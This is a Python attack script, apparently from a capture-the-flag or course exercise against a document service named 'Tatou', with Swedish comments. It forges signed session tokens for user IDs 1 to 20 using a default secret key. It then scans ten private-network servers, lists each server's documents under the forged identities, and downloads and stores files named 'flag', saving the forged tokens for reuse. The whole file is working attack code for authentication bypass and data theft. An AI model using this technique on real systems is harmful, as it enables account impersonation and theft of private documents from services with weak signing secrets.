# scan_all_flags.py
from itsdangerous import URLSafeTimedSerializer
import requests
import json
from pathlib import Path
import time
import os

print("╔═══════════════════════════════════════════════════╗")
print("║     FLAG SCANNER - Tatou Document Scanner        ║")
print("╚═══════════════════════════════════════════════════╝\n")

# ============================================================
# STEG 1: GENERERA TOKENS
# ============================================================
print("🔧 Genererar tokens...")

SECRET_KEY = os.environ.get("SECRET_KEY", "dev-secret-change-me")
SALT = "tatou-auth"
NUM = 20

s = URLSafeTimedSerializer(SECRET_KEY, salt=SALT)

token_data = []
for i in range(1, NUM+1):
    payload = {
        "uid": i,
        "login": f"Mr_important{i}",
        "email": f"important{i}@proton.me",
        "iss": "tatou-api",
        "kv": 1,
        "jti": f"forged-{i:03d}"
    }
    token = s.dumps(payload)
    token_data.append({"payload": payload, "token": token})

print(f"✓ Genererade {NUM} tokens\n")

# ============================================================
# STEG 2: SCANNA SERVRAR
# ============================================================

# Servrar att scanna
servers = [
    "10.11.12.17",
    "10.11.12.7", 
    "10.11.12.8",
    "10.11.12.9",
    "10.11.12.10",
    "10.11.12.18",
    "10.11.12.19",
    "10.11.12.12",
    "10.11.12.14",
    "10.11.12.15"
]

# Skapa output-mapp
output_dir = Path("flag_results")
output_dir.mkdir(exist_ok=True)

def test_server_health(server):
    """Kollar om servern är uppe"""
    try:
        response = requests.get(f"http://{server}:5000/healthz", timeout=3)
        return response.status_code == 200
    except:
        return False

def list_documents(server, token):
    """Hämtar dokumentlista från server"""
    url = f"http://{server}:5000/api/list-documents"
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            return response.json().get('documents', [])
        return []
    except:
        return []

def download_document(server, token, doc_id):
    """Laddar ner ett dokument"""
    url = f"http://{server}:5000/api/get-document/{doc_id}"
    headers = {"Authorization": f"Bearer {token}"}
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.content
        return None
    except:
        return None

# Huvudloop
all_results = {}
total_flags_found = 0

for server in servers:
    print(f"\n{'─'*50}")
    print(f"📡 Server: {server}")
    print(f"{'─'*50}")
    
    # Kolla om server är uppe
    if not test_server_health(server):
        print("  ⚠️  Server svarar inte, hoppar över...")
        continue
    
    print("  ✓ Server är online")
    server_flags = []
    
    # Testa varje token
    for idx, token_entry in enumerate(token_data, 1):
        token = token_entry['token']
        user_login = token_entry['payload']['login']
        
        print(f"  [{idx:2d}/20] {user_login}...", end=" ")
        
        documents = list_documents(server, token)
        
        # Leta efter flag-dokument
        flag_docs = [doc for doc in documents 
                     if 'flag' in doc.get('name', '').lower()]
        
        if flag_docs:
            print(f"🚩 {len(flag_docs)} flag!")
            
            for doc in flag_docs:
                doc_id = doc['id']
                doc_name = doc['name']
                
                print(f"      → {doc_name}", end=" ")
                
                # Ladda ner
                content = download_document(server, token, doc_id)
                
                if content:
                    # Spara med formaterat filnamn
                    safe_server = server.replace('.', '_')
                    filename = f"server{safe_server}_flag_{user_login}_{doc_id}.pdf"
                    filepath = output_dir / filename
                    
                    with open(filepath, 'wb') as f:
                        f.write(content)
                    
                    print(f"✓ Sparad")
                    
                    server_flags.append({
                        'user': user_login,
                        'doc_id': doc_id,
                        'doc_name': doc_name,
                        'file': filename,
                        'size': len(content)
                    })
                    total_flags_found += 1
                else:
                    print("✗ Misslyckades")
        else:
            print("─")
        
        time.sleep(0.1)  # Lite vänlig mot servern
    
    all_results[server] = server_flags
    
    if server_flags:
        print(f"\n  📊 {len(server_flags)} flag-dokument från denna server")

# ============================================================
# STEG 3: SAMMANFATTNING
# ============================================================

print(f"\n{'═'*50}")
print("📋 SLUTRAPPORT")
print(f"{'═'*50}\n")

# Spara sammanfattning
summary_file = output_dir / "summary.json"
with open(summary_file, 'w') as f:
    json.dump(all_results, f, indent=2)

# Spara även tokens för framtida bruk
tokens_file = output_dir / "tokens.json"
with open(tokens_file, 'w') as f:
    json.dump(token_data, f, indent=2)

print(f"🎯 Totalt antal flags: {total_flags_found}")
print(f"📁 Filer sparade i: {output_dir}/")
print(f"📄 Sammanfattning: {summary_file}")
print(f"🔑 Tokens sparade: {tokens_file}\n")

# Visa detaljerad rapport
for server, flags in all_results.items():
    if flags:
        print(f"\n{server}:")
        for flag in flags:
            print(f"  • {flag['user']}: {flag['doc_name']} ({flag['size']} bytes)")

print("\n✓ Klart!\n")
